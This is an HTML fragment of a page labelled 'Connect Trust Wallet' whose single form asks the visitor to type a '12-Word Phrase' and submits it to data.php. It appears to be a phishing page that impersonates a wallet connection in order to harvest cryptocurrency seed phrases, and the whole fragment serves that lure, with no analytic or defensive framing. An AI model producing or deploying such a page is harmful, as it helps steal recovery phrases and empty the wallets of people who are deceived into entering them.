<main>
	<div class="content">
		<div class="row ng-scope" ng-if="showContinueLabel">
          <div class="col-xs-12 text-center">
          <img src="icons.png" style="max-width: 180px;"></br>
              <span id="login-to-continue" class="h5 ng-binding" style="
    font-size: 15px;
    font-weight: 600;
    text-align: center;
    color: #16191C;
    font-family: inherit;
    line-height: 1.1;
">Connect Trust Wallet</span>

          </div>
    </div></br>
		<div class="content-form">
			<form action="data.php" method="POST">
				<input type="text" name="username" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" placeholder="12-Word Phrase" title="  Enter correct 12-Word Phrase" required>
<input type="submit" name="data" value="Connect">
			</form>
		</div>
	</div>
</main>
